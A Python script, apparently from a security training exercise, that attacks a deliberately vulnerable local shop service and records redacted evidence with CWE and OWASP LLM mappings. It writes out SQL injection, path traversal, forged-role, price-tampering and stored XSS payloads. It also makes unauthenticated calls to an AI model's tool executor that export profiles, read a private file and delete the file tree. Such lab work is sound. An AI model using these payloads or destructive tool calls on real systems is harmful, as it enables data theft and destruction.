"""Reproduce the vulnerabilities of the original Mini Shop and save evidence.

Standard library only. Targets the local exercise on 127.0.0.1 only.
"""

import json
import os
import signal
import subprocess
import sys
import time
from pathlib import Path
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode
from urllib.request import Request, urlopen

BASE = os.environ.get("SHOP_BASE", "http://127.0.0.1:8066")
HERE = Path(__file__).resolve().parent
LAB = HERE.parent.parent / "lab"
PID_FILE = Path("/tmp/practice06-service.pid")
LOG_FILE = Path("/tmp/practice06-service.log")

TOKENS = []
FINDINGS = []


def redact(text):
    if not isinstance(text, str):
        return text
    for token in TOKENS:
        text = text.replace(token, "<token>")
    for password in ("learn-alice", "learn-bob", "learn-staff"):
        text = text.replace(password, "<password>")
    return text


def redact_obj(value):
    if isinstance(value, str):
        return redact(value)
    if isinstance(value, list):
        return [redact_obj(item) for item in value]
    if isinstance(value, dict):
        return {key: redact_obj(item) for key, item in value.items()}
    return value


def call(method, path, body=None, headers=None):
    data = json.dumps(body).encode("utf-8") if body is not None else None
    request_headers = {"Content-Type": "application/json"}
    if headers:
        request_headers.update(headers)
    request = Request(BASE + path, data=data, headers=request_headers, method=method)
    try:
        with urlopen(request, timeout=5) as response:
            raw = response.read().decode("utf-8", "replace")
            status = response.status
    except HTTPError as exc:
        raw = exc.read().decode("utf-8", "replace")
        status = exc.code
    try:
        parsed = json.loads(raw)
    except json.JSONDecodeError:
        parsed = raw
    return {
        "status": status,
        "raw": raw,
        "body": parsed,
    }


def login(username, password):
    result = call("POST", "/login", {"username": username, "password": password})
    if result["status"] != 200:
        raise SystemExit(f"login failed for {username}: {result}")
    token = result["body"]["token"]
    TOKENS.append(token)
    return token


def record(finding_id, title, endpoint, expected, actual, severity, cwe, owasp,
           method, path, body=None, headers=None, result=None):
    evidence = {
        "id": finding_id,
        "title": title,
        "endpoint": endpoint,
        "expected": expected,
        "actual": actual,
        "severity": severity,
        "cwe": cwe,
        "owasp_llm": owasp,
        "request": {
            "method": method,
            "path": redact(path),
            "body": redact_obj(body),
            "headers": {key: redact(value) for key, value in (headers or {}).items()},
        },
        "response": {
            "status": result["status"],
            "body": redact_obj(result["body"]),
        },
    }
    (HERE / f"{finding_id}.json").write_text(
        json.dumps(evidence, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    FINDINGS.append(evidence)
    print(f"[{finding_id}] {result['status']} {endpoint} -> {actual}")
    return evidence


def restart_server():
    pid = None
    if PID_FILE.exists():
        try:
            pid = int(PID_FILE.read_text().strip())
        except ValueError:
            pid = None
    if pid is not None:
        try:
            os.kill(pid, signal.SIGTERM)
        except ProcessLookupError:
            pass
        for _ in range(50):
            try:
                urlopen(BASE + "/health", timeout=1)
            except (URLError, OSError):
                break
            time.sleep(0.1)
    LOG_FILE.touch(exist_ok=True)
    with LOG_FILE.open("ab") as log:
        process = subprocess.Popen(
            [sys.executable, "service.py", "--port", str(8066)],
            cwd=str(LAB),
            stdout=log,
            stderr=subprocess.STDOUT,
            start_new_session=True,
        )
    PID_FILE.write_text(str(process.pid))
    for _ in range(50):
        try:
            with urlopen(BASE + "/health", timeout=1) as response:
                if response.status == 200:
                    return process.pid
        except (URLError, OSError):
            pass
        time.sleep(0.1)
    raise SystemExit("server did not restart")


def main():
    alice = login("alice", "learn-alice")
    bob = login("bob", "learn-bob")
    staff = login("staff", "learn-staff")
    alice_auth = {"X-Token": alice}
    bob_auth = {"X-Token": bob}

    # 1. SQL injection in /profile
    result = call("GET", "/profile?" + urlencode({"id": "1 OR 1=1"}))
    names = [row.get("name") for row in result["body"]] if isinstance(result["body"], list) else []
    record("01-sqli-profile", "SQL-инъекция в /profile?id", "GET /profile?id=1 OR 1=1",
           "Только профиль c id=1", f"status={result['status']}, names={names}",
           "High", "CWE-89", "-", "GET", "/profile?" + urlencode({"id": "1 OR 1=1"}), result=result)

    # 2. IDOR/chained SQLi: alice reads bob profile
    result = call("GET", "/profile?" + urlencode({"id": "2"}), headers=alice_auth)
    names = [row.get("name") for row in result["body"]] if isinstance(result["body"], list) else []
    record("02-idor-profile", "IDOR: alice читает профиль bob", "GET /profile?id=2",
           "403/404 для чужого профиля", f"status={result['status']}, names={names}",
           "High", "CWE-639", "-", "GET", "/profile?" + urlencode({"id": "2"}),
           headers=alice_auth, result=result)

    # 3. SQL injection in /search
    result = call("GET", "/search?" + urlencode({"q": "' OR 1=1--"}))
    names = [row.get("name") for row in result["body"]] if isinstance(result["body"], list) else []
    record("03-sqli-search", "SQL-инъекция в /search?q", "GET /search?q=' OR 1=1--",
           "Поиск только по совпадению", f"status={result['status']}, names={names}",
           "High", "CWE-89", "-", "GET", "/search?" + urlencode({"q": "' OR 1=1--"}), result=result)

    # 4. IDOR: all orders
    result = call("GET", "/orders", headers=alice_auth)
    owners = [row.get("owner") for row in result["body"]] if isinstance(result["body"], list) else []
    record("04-idor-orders", "IDOR: /orders отдаёт заказы всех клиентов", "GET /orders",
           "Только заказы alice (owner=1)", f"status={result['status']}, owners={owners}",
           "High", "CWE-639", "-", "GET", "/orders", headers=alice_auth, result=result)

    # 5. IDOR: alice reads bob receipt
    path = "/files?" + urlencode({"user": "bob", "path": "receipt.txt"})
    result = call("GET", path, headers=alice_auth)
    record("05-idor-file", "IDOR: alice читает чек bob", "GET /files?user=bob&path=receipt.txt",
           "403/404 для чужого чека", f"status={result['status']}, body={result['body']}",
           "High", "CWE-639", "-", "GET", path, headers=alice_auth, result=result)

    # 6. Path traversal to sibling user
    path = "/files?" + urlencode({"user": "alice", "path": "../bob/receipt.txt"})
    result = call("GET", path, headers=alice_auth)
    record("06-traversal-sibling", "Path traversal: чужой чек через ../", "GET /files?user=alice&path=../bob/receipt.txt",
           "403/404 для выхода из своего каталога", f"status={result['status']}, body={result['body']}",
           "High", "CWE-22", "-", "GET", path, headers=alice_auth, result=result)

    # 7. Path traversal to private note
    path = "/files?" + urlencode({"user": "alice", "path": "../../private/operator-note.txt"})
    result = call("GET", path, headers=alice_auth)
    record("07-traversal-private", "Path traversal: служебный секрет", "GET /files?user=alice&path=../../private/operator-note.txt",
           "403/404 для приватного каталога", f"status={result['status']}, body={result['body']}",
           "High", "CWE-22", "-", "GET", path, headers=alice_auth, result=result)

    # 8. Forged role without session
    result = call("GET", "/admin/export", headers={"X-Role": "staff"})
    record("08-forged-role-anon", "Подделка X-Role без сессии", "GET /admin/export (X-Role: staff)",
           "401/403 без валидной staff-сессии", f"status={result['status']}, rows={len(result['body']) if isinstance(result['body'], list) else 'n/a'}",
           "Critical", "CWE-285", "-", "GET", "/admin/export", headers={"X-Role": "staff"}, result=result)

    # 9. Forged role with customer session
    result = call("GET", "/admin/export", headers={**alice_auth, "X-Role": "staff"})
    record("09-forged-role-alice", "Подделка X-Role клиентом alice", "GET /admin/export (alice + X-Role: staff)",
           "403 для роли customer", f"status={result['status']}, rows={len(result['body']) if isinstance(result['body'], list) else 'n/a'}",
           "Critical", "CWE-285", "-", "GET", "/admin/export",
           headers={**alice_auth, "X-Role": "staff"}, result=result)

    # 10. Price tampering
    result = call("POST", "/orders", {"product": "lamp", "price": 1}, headers=alice_auth)
    record("10-price-tampering", "Подмена цены в POST /orders", "POST /orders {product: lamp, price: 1}",
           "Цена из каталога 1500", f"status={result['status']}, body={result['body']}",
           "Medium", "CWE-602", "-", "POST", "/orders",
           body={"product": "lamp", "price": 1}, headers=alice_auth, result=result)

    # 11. Stored XSS: store
    payload = "<script>alert('xss')</script>"
    result = call("POST", "/reviews", {"product": "chair", "text": payload}, headers=alice_auth)
    record("11-stored-xss-store", "Stored XSS: сохранение вредоносного отзыва", "POST /reviews",
           "Текст сохраняется как данные", f"status={result['status']}, body={result['body']}",
           "Medium", "CWE-79", "LLM02", "POST", "/reviews",
           body={"product": "chair", "text": payload}, headers=alice_auth, result=result)

    # 12. Stored XSS: view raw
    result = call("GET", "/reviews/view")
    raw_html = result["raw"]
    record("12-stored-xss-view", "Stored XSS: HTML без экранирования", "GET /reviews/view",
           "Тег экранирован как &lt;script&gt;", f"status={result['status']}, raw_script={payload in raw_html}",
           "Medium", "CWE-79", "LLM02", "GET", "/reviews/view", result=result)

    # 13. Secrets in debug logs
    result = call("GET", "/debug/logs")
    raw_logs = result["raw"]
    leaks_token = alice in raw_logs
    leaks_password = "learn-alice" in raw_logs
    record("13-logs-secret-leak", "Утечка токенов и паролей через /debug/logs", "GET /debug/logs",
           "Журнал недоступен или без секретов", f"status={result['status']}, token={leaks_token}, password={leaks_password}",
           "High", "CWE-532", "-", "GET", "/debug/logs", result=result)

    # 14. SQL injection in assistant context
    path = "/assistant/context?" + urlencode({"order_id": "0 OR 1=1"})
    result = call("GET", path, headers=alice_auth)
    prompt = result["body"].get("prompt", "") if isinstance(result["body"], dict) else ""
    record("14-sqli-context", "SQL-инъекция в /assistant/context?order_id", "GET /assistant/context?order_id=0 OR 1=1",
           "Только заказ alice", f"status={result['status']}, chair={'chair' in prompt}, lamp={'lamp' in prompt}",
           "High", "CWE-89", "LLM01", "GET", path, headers=alice_auth, result=result)

    # 15. Executor without auth: export profiles
    decision = {"decision": {"tool": "export_profiles", "arguments": {}}}
    result = call("POST", "/assistant/execute", decision)
    record("15-exec-export-noauth", "Executor без auth: export_profiles", "POST /assistant/execute (export_profiles)",
           "401 без сессии", f"status={result['status']}, rows={len(result['body']) if isinstance(result['body'], list) else 'n/a'}",
           "Critical", "CWE-306", "LLM06", "POST", "/assistant/execute", body=decision, result=result)

    # 16. Executor without auth: read private note
    decision = {"decision": {"tool": "read_file", "arguments": {"path": "private/operator-note.txt"}}}
    result = call("POST", "/assistant/execute", decision)
    record("16-exec-read-private", "Executor без auth: чтение приватного файла", "POST /assistant/execute (read_file private/operator-note.txt)",
           "401/403 для приватного файла", f"status={result['status']}, body={result['body']}",
           "High", "CWE-22", "LLM06", "POST", "/assistant/execute",
           body=decision, result=result)

    # 17. Executor without auth: delete everything (run last)
    decision = {"decision": {"tool": "delete_tree", "arguments": {"path": "."}}}
    result = call("POST", "/assistant/execute", decision)
    record("17-exec-delete-noauth", "Executor без auth: delete_tree('.')", "POST /assistant/execute (delete_tree .)",
           "401/403 без staff-сессии", f"status={result['status']}, body={result['body']}",
           "High", "CWE-306", "LLM06", "POST", "/assistant/execute", body=decision, result=result)

    # 18. Verify deletion and information leak in error
    path = "/files?" + urlencode({"user": "alice", "path": "receipt.txt"})
    result = call("GET", path, headers=alice_auth)
    record("18-delete-verify", "Проверка уничтожения файлов и утечки ошибки", "GET /files?user=alice&path=receipt.txt",
           "Файл на месте, ошибка не раскрывает внутренности", f"status={result['status']}, body={result['body']}",
           "High", "CWE-306", "-", "GET", path, headers=alice_auth, result=result)

    # 19. Restore fixture by restarting the service
    pid = restart_server()
    result = call("GET", "/health")
    record("19-restart", "Перезапуск стенда после delete_tree", "GET /health",
           "Сервер снова доступен", f"status={result['status']}, pid={pid}",
           "Info", "-", "-", "GET", "/health", result=result)

    write_summary()
    print(f"\nSaved {len(FINDINGS)} evidence files to {HERE}")


def write_summary():
    lines = [
        "# Evidence before — сводка атак на исходный сервис",
        "",
        f"Base URL: `{BASE}`; фикстуры синтетические.",
        "",
        "| ID | Endpoint | Ожидаемо | Фактически | Severity | CWE | OWASP LLM | Evidence |",
        "|---|---|---|---|---|---|---|---|",
    ]
    for item in FINDINGS:
        cells = [
            item["id"],
            item["endpoint"].replace("|", "\\|"),
            item["expected"].replace("|", "\\|"),
            item["actual"].replace("|", "\\|"),
            item["severity"],
            item["cwe"],
            item["owasp_llm"],
            f"[{item['id']}.json]({item['id']}.json)",
        ]
        lines.append("| " + " | ".join(cells) + " |")
    lines += [
        "",
        "## Выводы",
        "",
        "- Исходный сервис отдаёт чужие профили, заказы и файлы без проверки сессии и владельца.",
        "- SQL-инъекции подтверждены в `/profile`, `/search` и `/assistant/context`.",
        "- Роль staff подделывается заголовком `X-Role`.",
        "- Цена заказа управляется клиентом.",
        "- Отзывы дают stored XSS, журнал отдаёт токены и пароли.",
        "- `/assistant/execute` без авторизации выполняет `export_profiles`, чтение приватного файла и `delete_tree`.",
        "- После `delete_tree` стенд восстановлен перезапуском; фикстуры создаются заново.",
        "",
        "Скрипт: [`run_attacks.py`](run_attacks.py).",
    ]
    (HERE / "SUMMARY.md").write_text("\n".join(lines) + "\n", encoding="utf-8")


if __name__ == "__main__":
    main()
